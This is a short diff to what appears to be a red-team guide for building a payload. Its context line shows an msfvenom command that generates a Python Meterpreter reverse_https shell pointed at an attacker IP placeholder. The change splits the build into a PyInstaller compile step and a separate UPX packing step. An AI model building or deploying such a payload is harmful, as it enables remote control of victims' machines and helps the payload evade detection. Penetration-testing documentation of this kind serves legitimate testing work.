@@ -101,5 +101,11 @@ msfvenom -p python/meterpreter/reverse_https LHOST=<attacker IP> LPORT=8443 -o p
 3. Compile python.py into a portable executable using PyInstaller (https://pypi.org/project/PyInstaller/)
 
 ```
-pyinstaller -F python.py --upx --brute python.exe
+pyinstaller -F python.py
+```
+
+4. Pack the python.exe payload using UPX (https://github.com/upx/upx)
+
+```
+upx --brute python.exe
 ```
